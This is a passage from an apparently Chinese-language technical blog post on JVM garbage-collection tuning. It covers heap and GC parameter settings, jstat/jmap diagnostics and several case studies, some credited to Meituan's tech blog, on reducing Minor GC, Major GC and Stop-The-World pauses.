GC。</p><p>选择应根据应用程序对象生命周期的分布情况，例如，如果应用存在大量的临时对象，则应选择更大的年轻代；如果存在大量的持久对象，则应适当增大年老代。</p><p>观察应用一段时间后，根据峰值时年老代所占内存来调整年轻代的大小，但应保留年老代至少1&#x2F;3的增长空间。</p></li><li><p>在配置较好的机器上（如多核、大内存），可以为年老代选择并行收集算法，使用<strong>XX:+UseParallelOldGC</strong>，默认为串行收集。</p></li><li><p>线程堆栈的设置：每个线程默认会分配1M的堆栈空间，用于存放栈帧、调用参数、局部变量等。</p><p>对于大多数应用来说，这个默认值过大，一般可以将其减小至256K。</p><p>减小线程堆栈大小可以在内存不变的情况下创建更多线程，但这也受限于操作系统的支持。</p></li></ul><h2 id="五：常见调优策略"><a href="#五：常见调优策略" class="headerlink" title="五：常见调优策略"></a>五：常见调优策略</h2><h3 id="5-1-调整内存大小"><a href="#5-1-调整内存大小" class="headerlink" title="5.1 调整内存大小"></a>5.1 调整内存大小</h3><ul><li><p>现象：垃圾收集频率非常频繁</p></li><li><p>措施：考虑增加堆内存大小。</p></li><li><p>说明：</p></li></ul><p>频繁的垃圾收集通常是由于内存过小，导致需要不断进行垃圾收集以释放空间来容纳新对象。</p><p>因此，增加堆内存大小可以显著降低垃圾收集的频率。</p><p>需要注意的是，如果垃圾收集次数虽然频繁但每次回收的对象却很少，那么问题可能不在于内存过小，而是由于内存泄漏导致的对象无法被正确回收，从而引发了频繁的垃圾收集。</p><p>在这种情况下，调整内存大小可能无法解决问题，而需要对代码进行进一步的分析和调试。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">//设置堆初始值  </span><br><span class="line">指令1：-Xms2g  </span><br><span class="line">指令2：-XX:InitialHeapSize=2048m  </span><br><span class="line">  </span><br><span class="line">//设置堆区最大值  </span><br><span class="line">指令1：\`-Xmx2g\`   </span><br><span class="line">指令2： -XX:MaxHeapSize=2048m  </span><br><span class="line">  </span><br><span class="line">//新生代内存配置  </span><br><span class="line">指令1：-Xmn512m  </span><br><span class="line">指令2：-XX:MaxNewSize=512m</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-2-调整GC触发时机"><a href="#5-2-调整GC触发时机" class="headerlink" title="5.2 调整GC触发时机"></a>5.2 调整GC触发时机</h3><ul><li><p>现象：</p><p>在CMS和G1垃圾回收器下，频繁发生Full GC，导致程序严重卡顿。</p></li><li><p>说明：</p></li></ul><p>在G1和CMS的部分GC阶段是并发进行的，即业务线程和垃圾收集线程同时运行。</p><p>这意味着在垃圾收集过程中，业务线程可能会生成新的对象。</p><p>因此，在进行垃圾收集时，需要预留一部分内存空间来容纳新产生的对象。</p><p>如果此时内存空间不足以容纳新对象，JVM会停止并发收集，暂停所有业务线程（STW），以确保垃圾收集正常进行。</p><p>可以通过调整GC的触发时机（例如在老年代占用60%时触发GC）来预留足够的空间给业务线程创建的对象。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">//使用多少比例的老年代后开始CMS收集，默认是68%，如果频繁发生SerialOld卡顿，应该调小  </span><br><span class="line">-XX:CMSInitiatingOccupancyFraction  </span><br><span class="line">  </span><br><span class="line">//G1混合垃圾回收周期中要包括的旧区域设置占用率阈值。默认占用率为 65%  </span><br><span class="line">-XX:G1MixedGCLiveThresholdPercent=65 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-3-调整对象晋升到老年代年龄阈值"><a href="#5-3-调整对象晋升到老年代年龄阈值" class="headerlink" title="5.3 调整对象晋升到老年代年龄阈值"></a>5.3 调整对象晋升到老年代年龄阈值</h3><ul><li><p>现象：</p><p>老年代发生频繁的GC，每次清理回收大量对象。</p></li><li><p>说明：</p></li></ul><p>当对象的晋升年龄设定较低时，新生代中的对象很快就会被晋升到老年代。</p><p>这导致老年代中对象数量增多，其中很多对象实际上在短时间内就可能被回收。</p><p>通过调整对象的晋升年龄，可以减少过早进入老年代的对象数量，从而减少老年代的空间压力和频繁的GC。</p><p>注意：提高晋升年龄虽然可以减缓老年代的压力，但同时可能会增加新生代的GC频率，因为对象在新生代的停留时间变长。</p><p>此外，新生代中频繁复制这些对象可能会导致新生代的GC时间也相应增长。</p><p>在调整晋升年龄时，应综合考虑新生代和老年代的GC性能，以达到最优的系统性能平衡。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">// 进入老年代最小的GC年龄,年轻代对象转换为老年代对象最小年龄值，默认值7  </span><br><span class="line">-XX:InitialTenuringThreshol=7 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-4-调整大对象进入老年代的标准"><a href="#5-4-调整大对象进入老年代的标准" class="headerlink" title="5.4 调整大对象进入老年代的标准"></a>5.4 调整大对象进入老年代的标准</h3><ul><li><p>现象：</p><p>老年代经常发生频繁的GC，每次回收大量对象，而这些对象的体积都相对较大。</p></li><li><p>说明：</p></li></ul><p>大量大对象直接分配到老年代会快速填满老年代空间，导致老年代频繁GC。</p><p>为解决此问题，可调整大对象直接进入老年代的标准。</p><p>需要注意：将大对象调整为直接进入老年代后，可能会增加新生代的GC频率和时间。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">//新生代可容纳的最大对象,大于则直接会分配到老年代，0代表没有限制。  </span><br><span class="line"> -XX:PretenureSizeThreshold=1000000 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-5-调整内存区域大小比率"><a href="#5-5-调整内存区域大小比率" class="headerlink" title="5.5 调整内存区域大小比率"></a>5.5 调整内存区域大小比率</h3><ul><li><p>现象：</p><p>某一内存区域频繁发生GC，而其他区域的GC表现正常。</p></li><li><p>说明：</p></li></ul><p>频繁的GC可能是由于对应区域的空间不足所致，需要不断进行GC以释放空间。</p><p>在JVM堆内存无法增加的情况下，可以考虑调整对应区域的大小比率。</p><p>注意：尽管频繁的GC可能是由于空间不足造成的，但也有可能是因为内存泄漏导致内存无法回收，进而引发GC频繁。</p><p>因此，在调整内存区域大小比率之前，需要仔细分析是否存在内存泄漏问题。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">// survivor区和Eden区大小比率  </span><br><span class="line">指令：-XX:SurvivorRatio=6  //S区和Eden区占新生代比率为1:6,两个S区2:6  </span><br><span class="line">  </span><br><span class="line">// 新生代和老年代的占比  </span><br><span class="line">-XX:NewRatio=4  //表示新生代:老年代 = 1:4 即老年代占整个堆的4/5；默认值=2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-6-调整对象晋升至老年代的年龄阈值"><a href="#5-6-调整对象晋升至老年代的年龄阈值" class="headerlink" title="5.6 调整对象晋升至老年代的年龄阈值"></a>5.6 调整对象晋升至老年代的年龄阈值</h3><ul><li><p>现象：</p><p>老年代频繁进行GC，每次回收大量对象。</p></li><li><p>说明：</p></li></ul><p>如果对象的晋升年龄较小，新生代中的对象很快就会晋升至老年代，导致老年代中对象数量增多。</p><p>然而，这些对象在接下来的短时间内可能会被回收。为解决老年代空间不足导致的频繁GC问题，可调整对象晋升至老年代的年龄阈值，使对象不那么容易晋升至老年代。</p><p>注意：增加对象晋升年龄可能会导致新生代中对象的停留时间增加，从而增加新生代的GC频率，并且复制大对象可能导致新生代GC的时间延长。</p><p>在调整晋升年龄时，需综合考虑新生代和老年代的GC性能，以获得最优的系统性能平衡。</p><h3 id="5-7-调整垃圾回收的触发时机"><a href="#5-7-调整垃圾回收的触发时机" class="headerlink" title="5.7 调整垃圾回收的触发时机"></a>5.7 调整垃圾回收的触发时机</h3><ul><li><p>现象：</p><p>G1和CMS垃圾收集器在执行垃圾回收时与应用程序的业务线程并发工作。</p><p>在垃圾回收过程中，业务线程可能生成新对象，需预留内存空间以容纳这些新产生的对象。</p><p>若内存空间不足，JVM会暂停所有业务线程（STW）以确保垃圾回收正常进行。</p></li><li><p>说明：</p></li></ul><p>在进行垃圾回收时，若未预留足够的内存空间供新对象使用，可能导致内存压力过大，从而触发STW。</p><p>通过调整垃圾回收的触发时机来预留足够的内存空间，如可设定在老年代占用达到一定比例时触发垃圾回收。</p><p>这有助于提前释放内存空间，为新对象分配留出足够的空间，从而减少因内存不足而导致的STW情况。</p><p>注意：</p><p>提早触发垃圾回收会增加老年代垃圾回收的频率，这可能导致一些性能开销，如额外的CPU使用和系统停顿时间。</p><p>因此，在调整垃圾回收的触发时机时，需要在性能与内存利用率之间找到恰当的平衡。</p><h3 id="5-8-设置符合预期的停顿时间"><a href="#5-8-设置符合预期的停顿时间" class="headerlink" title="5.8 设置符合预期的停顿时间"></a>5.8 设置符合预期的停顿时间</h3><blockquote><p><strong>现象</strong>： 程序间接性的卡顿 <strong>原因</strong>：如果没有确切的停顿时间设定，垃圾收集器以吞吐量为主，那么垃圾收集时间就会不稳定。 <strong>注意</strong>：不要设置不切实际的停顿时间，单次时间越短也意味着需要更多的GC次数才能回收完原有数量的垃圾.</p></blockquote><p>参数配置：l</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">//GC停顿时间，垃圾收集器会尝试用各种手段达到这个时间  </span><br><span class="line">     -XX:MaxGCPauseMillis </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="六：-JVM调优案例和实践"><a href="#六：-JVM调优案例和实践" class="headerlink" title="六： JVM调优案例和实践"></a>六： JVM调优案例和实践</h2><h3 id="案例1：网站流量增加后，网页响应速度变慢"><a href="#案例1：网站流量增加后，网页响应速度变慢" class="headerlink" title="案例1：网站流量增加后，网页响应速度变慢"></a>案例1：网站流量增加后，网页响应速度变慢</h3><p><strong>问题描述</strong> 在测试环境中，网站速度较快，但一到生产环境就显著变慢。 <strong>问题分析</strong></p><ol><li><p><strong>初步诊断</strong>： 通过使用 <strong>jstat -gc</strong> 指令监控线上JVM的GC活动，发现GC频率和所占时间异常高。这表明频繁的GC正影响业务线程的执行，从而导致页面响应缓慢。</p></li><li><p><strong>内存调整后的问题</strong>： 增加JVM的堆内存从2GB到16GB后，虽然常规请求的处理速度提高，但出现了间歇性的更长时间卡顿。进一步监控发现，虽然Full GC（FGC）的次数不多，但每次的持续时间过长，有时达到几十秒。</p></li><li><p><strong>原因推断</strong>： 增加堆内存后，虽然减少了频繁的垃圾回收，但因为PS+PO垃圾收集器（Parallel Scavenge + Parallel Old）在垃圾标记和收集阶段都需要停止所有工作线程（STW），所以每次GC时业务线程的停顿时间显著增长。</p></li></ol><p><strong>解决方案</strong></p><ol><li><p><strong>调整垃圾收集器</strong>： 服务不稳定的根本问题是垃圾回收过程中的停顿时间过长，由于默认的PS+PO组合垃圾收集器导致。为了解决这一问题，可更换为并发类的收集器，如CMS垃圾收集器。</p></li><li><p><strong>CMS配置优化</strong>： 根据系统运行的实际情况，调整CMS的启动阈值，预设了合理的停顿时间，以确保不会因为内存回收而影响用户的使用体验。</p></li></ol><h3 id="案例2：CPU飙升和GC频繁的调优实践"><a href="#案例2：CPU飙升和GC频繁的调优实践" class="headerlink" title="案例2：CPU飙升和GC频繁的调优实践"></a>案例2：CPU飙升和GC频繁的调优实践</h3><p><strong>问题描述：</strong> 随着在线游戏玩家数量的增加，系统出现CPU飙升和GC频繁的情况，导致游戏体验下降。 <strong>问题分析：</strong> 使用监控工具检查系统的CPU使用情况和GC情况，发现系统在高负载情况下CPU占用过高，且GC频率过于频繁。 <strong>解决方案：</strong></p><ol><li><p><strong>代码优化</strong>：进行代码审查和性能分析，发现并优化存在不必要的循环操作和资源竞争问题，以减少CPU占用。</p></li><li><p><strong>堆内存调整</strong>：增加堆内存大小，减少GC的频率，提高系统的吞吐量和稳定性，确保系统能够应对增加的玩家数量。</p></li><li><p><strong>GC算法调优</strong>：根据系统负载情况和硬件环境，选择合适的GC算法，并调整相应的参数，以减少GC造成的性能损耗。例如，针对大堆内存和高并发情况，可以考虑使用并行GC或G1收集器，并根据具体情况调整相关参数以提升性能。</p></li></ol><h3 id="案例3：数据分析平台系统频繁-Full-GC"><a href="#案例3：数据分析平台系统频繁-Full-GC" class="headerlink" title="案例3：数据分析平台系统频繁 Full GC"></a>案例3：数据分析平台系统频繁 Full GC</h3><p><strong>问题描述：</strong> 数据分析平台对用户在App中的行为进行定时分析统计，但系统频繁发生Full GC，导致页面打开卡顿，影响用户体验。 <strong>问题分析：</strong></p><ol><li><p><strong>CMS GC算法使用</strong>：系统使用CMS（Concurrent Mark-Sweep）GC算法，但频繁的Full GC表明GC调优方面存在问题。</p></li><li><p><strong>Young GC后存活对象进入老年代</strong>：使用jstat命令监控发现，每次Young GC后大约有10%的存活对象进入老年代，这意味着Survivor区空间可能设置过小，导致存活对象在Survivor区放不下而提前进入老年代。</p></li></ol><p><strong>解决方案：</strong></p><ol><li><p><strong>调整Survivor区大小</strong>：增大Survivor区大小，确保其能容纳Young GC后的存活对象，使存活对象能在Survivor区经历多次Young GC达到年龄阈值后才进入老年代。</p></li><li><p><strong>优化存活对象进入老年代的大小</strong>：调整Survivor区大小后，每次Young GC后进入老年代的存活对象稳定在几百KB左右，大大降低了Full GC的频率，提升了系统的稳定性和性能。</p></li></ol><h3 id="案例4：内存飙高问题定位"><a href="#案例4：内存飙高问题定位" class="headerlink" title="案例4：内存飙高问题定位"></a>案例4：内存飙高问题定位</h3><p><strong>问题描述</strong>：在Java进程中，内存飙高，可能是由于大量对象创建或内存泄漏导致的。</p><p>持续的内存飙高可能表明垃圾回收跟不上对象创建速度，或存在内存泄漏导致对象无法回收。 <strong>问题分析：</strong></p><ol><li><strong>观察垃圾回收情况：</strong></li></ol><ul><li><p>使用 <strong>jstat -gc PID 1000</strong> 命令观察GC次数、时间等信息，每隔一秒打印一次。</p></li><li><p>使用 <strong>jmap -histo PID | head -20</strong> 命令查看堆内存占用空间最大的前20个对象类型。</p></li><li><p>如果GC频率高且每次回收的内存空间正常，可能是对象创建速度过快导致内存占用高；如果每次回收的内存很少，可能是内存泄漏。</p></li></ul><ol start="3"><li><strong>导出堆内存文件快照：</strong></li></ol><ul><li>使用 <strong>jmap -dump:live,format&#x3D;b,file&#x3D;&#x2F;home&#x2F;myheapdump.hprof PID</strong> 命令将堆内存信息导出到文件，以进一步分析内存占用情况。</li></ul><p><strong>解决方案：</strong> 通过使用VisualVM对dump文件进行离线分析，识别内存占用较高的对象，并进一步定位到创建这些对象的业务代码位置，以便从代码和业务场景中精确定位具体问题。</p><h3 id="案例5：Major-GC和Minor-GC频繁"><a href="#案例5：Major-GC和Minor-GC频繁" class="headerlink" title="案例5：Major GC和Minor GC频繁"></a>案例5：Major GC和Minor GC频繁</h3><p>这个案例，来自美团技术官网</p><h4 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h4><p>服务情况：Minor GC每分钟100次 ，Major GC每4分钟一次，单次Minor GC耗时25ms，单次Major GC耗时200ms，接口响应时间50ms。</p><p>由于这个服务要求低延时高可用，结合上文中提到的GC对服务响应时间的影响，计算可知由于Minor GC的发生，12.5%的请求响应时间会增加，其中8.3%的请求响应时间会增加25ms，可见当前GC情况对响应时间影响较大。</p><p><em>（50ms+25ms）× 100次&#x2F;60000ms &#x3D; 12.5%，50ms × 100次&#x2F;60000ms &#x3D; 8.3%</em> 。</p><p>优化目标：降低TP99、TP90时间。</p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>首先优化Minor GC频繁问题。通常情况下，由于新生代空间较小，Eden区很快被填满，就会导致频繁Minor GC，因此可以通过增大新生代空间来降低Minor GC的频率。例如在相同的内存分配率的前提下，新生代中的Eden区增加一倍，Minor GC的次数就会减少一半。</p><p>这时很多人有这样的疑问，扩容Eden区虽然可以减少Minor GC的次数，但会增加单次Minor GC时间么？根据上面公式，如果单次Minor GC时间也增加，很难保证最后的优化效果。</p><p>结合下面情况来分析，单次Minor GC时间主要受哪些因素影响？是否和新生代大小存在线性关系？</p><p>首先，单次Minor GC时间由以下两部分组成：T1（扫描新生代）和 T2（复制存活对象到Survivor区）如下图。（注：这里为了简化问题，我们认为T1只扫描新生代判断对象是否存活的时间，其实该阶段还需要扫描部分老年代，后面案例中有详细描述。）</p><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/14.png"></p><ul><li><p>扩容前：新生代容量为R ，假设对象A的存活时间为750ms，Minor GC间隔500ms，那么本次Minor GC时间&#x3D; T1（扫描新生代R）+T2（复制对象A到S）。</p></li><li><p>扩容后：新生代容量为2R ，对象A的生命周期为750ms，那么Minor GC间隔增加为1000ms，此时Minor GC对象A已不再存活，不需要把它复制到Survivor区，那么本次GC时间 &#x3D; 2 × T1（扫描新生代R），没有T2复制时间。</p></li></ul><p>可见，扩容后，Minor GC时增加了T1（扫描时间），但省去T2（复制对象）的时间，更重要的是对于虚拟机来说，复制对象的成本要远高于扫描成本，所以，单次<strong>Minor GC时间更多取决于GC后存活对象的数量，而非Eden区的大小</strong>。因此如果堆中短期对象很多，那么扩容新生代，单次Minor GC时间不会显著增加。下面需要确认下服务中对象的生命周期分布情况：</p><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/15.png"><br>通过上图GC日志中两处红色框标记内容可知：</p><ol><li><p>new threshold &#x3D; 2（动态年龄判断，对象的晋升年龄阈值为2），对象仅经历2次Minor GC后就晋升到老年代，这样老年代会迅速被填满，直接导致了频繁的Major GC。</p></li><li><p>Major GC后老年代使用空间为300M+，意味着此时绝大多数(86% &#x3D; 2G&#x2F;2.3G)的对象已经不再存活，也就是说生命周期长的对象占比很小。</p></li></ol><p>由此可见，服务中存在大量短期临时对象，扩容新生代空间后，Minor GC频率降低，对象在新生代得到充分回收，只有生命周期长的对象才进入老年代。这样老年代增速变慢，Major GC频率自然也会降低。</p><h4 id="优化结果"><a href="#优化结果" class="headerlink" title="优化结果"></a>优化结果</h4><p>通过扩容新生代为为原来的三倍，单次Minor GC时间增加小于5ms，频率下降了60%，服务响应时间TP90，TP99都下降了10ms+，服务可用性得到提升。</p><p>调整前：<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/16.png"><br>调整后：<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/17.png"></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>如何选择各分区大小应该依赖应用程序中<strong>对象生命周期的分布情况：如果应用存在大量的短期对象，应该选择较大的年轻代；如果存在相对较多的持久对象，老年代应该适当增大。</strong></p><h4 id="更多思考"><a href="#更多思考" class="headerlink" title="更多思考"></a>更多思考</h4><p>关于上文中提到晋升年龄阈值为2，很多同学有疑问，为什么设置了MaxTenuringThreshold&#x3D;15，对象仍然仅经历2次Minor GC，就晋升到老年代？这里涉及到“动态年龄计算”的概念。</p><p><strong>动态年龄计算</strong>：</p><p>Hotspot遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了survivor区的一半时，取这个年龄和MaxTenuringThreshold中更小的一个值，作为新的晋升年龄阈值。在本案例中，调优前：Survivor区 &#x3D; 64M，desired survivor &#x3D; 32M，此时Survivor区中age&lt;&#x3D;2的对象累计大小为41M，41M大于32M，所以晋升年龄阈值被设置为2，下次Minor GC时将年龄超过2的对象被晋升到老年代。</p><p>JVM引入动态年龄计算，主要基于如下两点考虑：</p><ol><li><p>如果固定按照MaxTenuringThreshold设定的阈值作为晋升条件：</p><p>a）MaxTenuringThreshold设置的过大，原本应该晋升的对象一直停留在Survivor区，直到Survivor区溢出，一旦溢出发生，Eden+Svuvivor中对象将不再依据年龄全部提升到老年代，这样对象老化的机制就失效了。</p><p>b）MaxTenuringThreshold设置的过小，“过早晋升”即对象不能在新生代充分被回收，大量短期对象被晋升到老年代，老年代空间迅速增长，引起频繁的Major GC。分代回收失去了意义，严重影响GC性能。</p></li><li><p>相同应用在不同时间的表现不同：特殊任务的执行或者流量成分的变化，都会导致对象的生命周期分布发生波动，那么固定的阈值设定，因为无法动态适应变化，会造成和上面相同的问题。</p></li></ol><p>总结来说，为了更好的适应不同程序的内存情况，虚拟机并不总是要求对象年龄必须达到Maxtenuringthreshhold再晋级老年代。</p><h3 id="美团案例6-请求高峰期发生GC，导致服务可用性下降"><a href="#美团案例6-请求高峰期发生GC，导致服务可用性下降" class="headerlink" title="美团案例6: 请求高峰期发生GC，导致服务可用性下降"></a>美团案例6: 请求高峰期发生GC，导致服务可用性下降</h3><p>这个案例，来自美团技术官网</p><h4 id="确定目标-1"><a href="#确定目标-1" class="headerlink" title="确定目标"></a>确定目标</h4><p>GC日志显示，高峰期CMS在重标记（Remark）阶段耗时1.39s。</p><p>Remark阶段是Stop-The-World（以下简称为STW）的，即在执行垃圾回收时，Java应用程序中除了垃圾回收器线程之外其他所有线程都被挂起，意味着在此期间，用户正常工作的线程全部被暂停下来，这是低延时服务不能接受的。本次优化目标是降低Remark时间。</p><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/18.png"></p><h4 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h4><p>解决问题前，先回顾一下CMS的四个主要阶段，以及各个阶段的工作内容。下图展示了CMS各个阶段可以标记的对象，用不同颜色区分。</p><ol><li><p>Init-mark初始标记(STW) ，该阶段进行可达性分析，标记GC ROOT能直接关联到的对象，所以很快。</p></li><li><p>Concurrent-mark并发标记，由前阶段标记过的绿色对象出发，所有可到达的对象都在本阶段中标记。</p></li><li><p>Remark重标记(STW) ，暂停所有用户线程，重新扫描堆中的对象，进行可达性分析，标记活着的对象。因为并发标记阶段是和用户线程并发执行的过程，所以该过程中可能有用户线程修改某些活跃对象的字段，指向了一个未标记过的对象，如下图中红色对象在并发标记开始时不可达，但是并行期间引用发生变化，变为对象可达，这个阶段需要重新标记出此类对象，防止在下一阶段被清理掉，这个过程也是需要STW的。特别需要注意一点，这个阶段是以新生代中对象为根来判断对象是否存活的。</p></li><li><p>并发清理，进行并发的垃圾清理。</p></li></ol><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/19.png"><br>可见，Remark阶段主要是通过扫描堆来判断对象是否存活。那么准确判断对象是否存活，需要扫描哪些对象？CMS对老年代做回收，Remark阶段仅扫描老年代是否可行？结论是不可行，原因如下：<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/20.png"><br>如果仅扫描老年代中对象，即以老年代中对象为根，判断对象是否存在引用，上图中，对象A因为引用存在新生代中，它在Remark阶段就不会被修正标记为可达，GC时会被错误回收。</p><p>新生代对象持有老年代中对象的引用，这种情况称为<strong>“跨代引用”</strong>。因它的存在，Remark阶段必须扫描整个堆来判断对象是否存活，包括图中灰色的不可达对象。</p><p>灰色对象已经不可达，但仍然需要扫描的原因：<strong>新生代GC和老年代的GC是各自分开独立进行的</strong>，只有Minor GC时才会使用根搜索算法，标记新生代对象是否可达，也就是说虽然一些对象已经不可达，但在Minor GC发生前不会被标记为不可达，CMS也无法辨认哪些对象存活，只能全堆扫描（新生代+老年代）。</p><p>由此可见堆中对象的数目影响了Remark阶段耗时。 分析GC日志可以得出同样的规律，Remark耗时&gt;500ms时，新生代使用率都在75%以上。这样降低Remark阶段耗时问题转换成如何减少新生代对象数量。</p><p>新生代中对象的特点是“朝生夕灭”，这样如果Remark前执行一次Minor GC，大部分对象就会被回收。</p><p>CMS就采用了这样的方式，在Remark前增加了一个可中断的并发预清理（CMS-concurrent-abortable-preclean），该阶段主要工作仍然是并发标记对象是否存活，只是这个过程可被中断。</p><p>此阶段在Eden区使用超过2M时启动，当然2M是默认的阈值，可以通过参数修改。如果此阶段执行时等到了Minor GC，那么上述灰色对象将被回收，Reamark阶段需要扫描的对象就少了。</p><p>除此之外CMS为了避免这个阶段没有等到Minor GC而陷入无限等待，提供了参数CMSMaxAbortablePrecleanTime ，默认为5s，含义是如果可中断的预清理执行超过5s，不管发没发生Minor GC，都会中止此阶段，进入Remark。</p><p>根据GC日志红色标记2处显示，可中断的并发预清理执行了5.35s，超过了设置的5s被中断，期间没有等到Minor GC ，所以Remark时新生代中仍然有很多对象。</p><p>对于这种情况，CMS提供CMSScavengeBeforeRemark参数，用来保证Remark前强制进行一次Minor GC。</p><h4 id="优化结果-1"><a href="#优化结果-1" class="headerlink" title="优化结果"></a>优化结果</h4><p>经过增加CMSScavengeBeforeRemark参数，单次执行时间&gt;200ms的GC停顿消失，从监控上观察，GCtime和业务波动保持一致，不再有明显的毛刺。<br><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/21.png"></p><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>通过案例分析了解到，由于跨代引用的存在，CMS在Remark阶段必须扫描整个堆，同时为了避免扫描时新生代有很多对象，增加了可中断的预清理阶段用来等待Minor GC的发生。只是该阶段有时间限制，如果超时等不到Minor GC，Remark时新生代仍然有很多对象，我们的调优策略是，通过参数强制Remark前进行一次Minor GC，从而降低Remark阶段的时间。</p><h4 id="更多思考-1"><a href="#更多思考-1" class="headerlink" title="更多思考"></a>更多思考</h4><p>案例中只涉及老年代GC，其实新生代GC存在同样的问题，即老年代可能持有新生代对象引用，所以Minor GC时也必须扫描老年代。</p><p><strong>JVM是如何避免Minor GC时扫描全堆的？</strong> 经过统计信息显示，老年代持有新生代对象引用的情况不足1%，根据这一特性JVM引入了卡表（card table）来实现这一目的。如下图所示：</p><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/22.png"><br><strong>卡表</strong>的具体策略是将老年代的空间分成大小为512B的若干张卡（card）。卡表本身是单字节数组，数组中的每个元素对应着一张卡，当发生老年代引用新生代时，虚拟机将该卡对应的卡表元素设置为适当的值。如上图所示，卡表3被标记为脏（卡表还有另外的作用，标识并发标记阶段哪些块被修改过），之后Minor GC时通过扫描卡表就可以很快的识别哪些卡中存在老年代指向新生代的引用。这样虚拟机通过空间换时间的方式，避免了全堆扫描。</p><p>总结来说，CMS的设计聚焦在获取最短的时延，为此它“不遗余力”地做了很多工作，包括尽量让应用程序和GC线程并发、增加可中断的并发预清理阶段、引入卡表等，虽然这些操作牺牲了一定吞吐量但获得了更短的回收停顿时间。</p><h3 id="美团案例7：发生Stop-The-World的GC"><a href="#美团案例7：发生Stop-The-World的GC" class="headerlink" title="美团案例7：发生Stop-The-World的GC"></a>美团案例7：发生Stop-The-World的GC</h3><p>这个案例，来自美团技术官网</p><h4 id="确定目标-2"><a href="#确定目标-2" class="headerlink" title="确定目标"></a>确定目标</h4><p>GC日志如下图（在GC日志中，Full GC是用来说明这次垃圾回收的停顿类型，代表STW类型的GC，并不特指老年代GC），根据GC日志可知本次Full GC耗时1.23s。这个在线服务同样要求低时延高可用。</p><p>本次优化目标是降低单次STW回收停顿时间，提高可用性。</p><p><img src="/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/23.png"></p><h4 id="优化-2"><a href="#优化-2" class="headerlink" title="优化"></a>优化</h4><p>首先，什么时候可能会触发STW的Full GC呢？</p><ol><li><p>Perm空间不足；</p></li><li><p>CMS GC时出现promotion failed和concurrent mode failure（concurrent mode failure发生的原因一般是CMS正在进行，但是由于老年代空间不足，需要尽快回收老年代里面的不再被使用的对象，这时停止所有的线程，同时终止CMS，直接进行Serial Old GC）；</p></li><li><p>统计得到的Young GC晋升到老年代的平均大小大于老年代的剩余空间；</p></li><li><p>主动触发Full GC（执行jmap -histo:live [pid]）来避免碎片问题。</p></li></ol><p>然后，我们来逐一分析一下：</p><ul><li><p>排除原因2：如果是原因2中两种情况，日志中会有特殊标识，目前没有。</p></li><li><p>排除原因3：根据GC日志，当时老年代使用量仅为20%，也不存在大于2G的大对象产生。</p></li><li><p>排除原因4：因为当时没有相关命令执行。</p></li><li><p>锁定原因1：根据日志发现Full GC后，Perm区变大了，推断是由于永久代空间不足容量扩展导致的。</p></li></ul><p>找到原因后解决方法有两种：</p><ol><li><p>通过把-XX:PermSize参数和-XX:MaxPermSize设置成一样，强制虚拟机在启动的时候就把永久代的容量固定下来，避免运行时自动扩容。</p></li><li><p>CMS默认情况下不会回收Perm区，通过参数CMSPermGenSweepingEnabled、CMSClassUnloadingEnabled ，可以让CMS在Perm区容量不足时对其回收。</p></li></ol><p>由于该服务没有生成大量动态类，回收Perm区收益不大，所以我们采用方案1，启动时将Perm区大小固定，避免进行动态扩容。</p><h4 id="优化结果-2"><a href="#优化结果-2" class="headerlink" title="优化结果"></a>优化结果</h4><p>调整参数后，服务不再有Perm区扩容导致的STW GC发生。</p><h4 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h4><p>对于性能要求很高的服务，建议将MaxPermSize和MinPermSize设置成一致（JDK8开始，Perm区完全消失，转而使用元空间。而元空间是直接存在内存中，不在JVM中），Xms和Xmx也设置为相同，这样可以减少内存自动扩容和收缩带来的性能损失。虚拟机启动的时候就会把参数中所设定的内存全部化为私有，即使扩容前有一部分内存不会被用户代码用到，这部分内存在虚拟机中被标识为虚拟内存，也不会交给其他进程使用。</p><h2 id="八：JVM调优常见面试题的精简答案"><a href="#八：JVM调优常见面试题的精简答案" class="headerlink" title="八：JVM调优常见面试题的精简答案"></a>八：JVM调优常见面试题的精简答案</h2><h4 id="8-1、调优包括哪些维度？"><a href="#8-1、调优包括哪些维度？" class="headerlink" title="8. 1、调优包括哪些维度？"></a>8. 